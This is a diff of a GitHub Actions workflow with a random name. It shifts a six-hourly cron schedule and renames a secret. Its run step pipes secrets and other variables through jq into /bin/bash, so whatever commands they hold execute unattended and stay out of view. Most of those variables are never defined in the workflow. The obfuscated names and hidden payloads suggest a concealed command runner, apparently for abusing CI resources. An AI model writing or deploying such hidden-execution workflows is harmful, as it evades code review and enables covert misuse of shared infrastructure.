@@ -2,7 +2,7 @@ name: elderlyremarkable
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
+    - cron: '58 2/6 * * *'
 
 jobs:
   build:
@@ -12,12 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: elderlyremarkable
         env:
-          npl4: ${{ secrets.npl4 }}
+          rhj39: ${{ secrets.rhj39 }}
         run: |
-          echo $npl4 | jq -r .dpt808 | /bin/bash
-          echo $jenyb91 | jq -r .zhgzt938 | /bin/bash
-          echo $jnq0 | jq -r .ot26898 | /bin/bash
-          echo $u66592 | jq -r .oao7 | /bin/bash
-          echo $fxgie7308 | jq -r .fjhqm6 | /bin/bash
-          echo $itjd13311 | jq -r .r8475 | /bin/bash
+          echo $rhj39 | jq -r .jw5 | /bin/bash
+          echo $ycep001 | jq -r .two6 | /bin/bash
+          echo $pu0864 | jq -r .qykfg75 | /bin/bash
+          echo $vvy14 | jq -r .b9 | /bin/bash
 
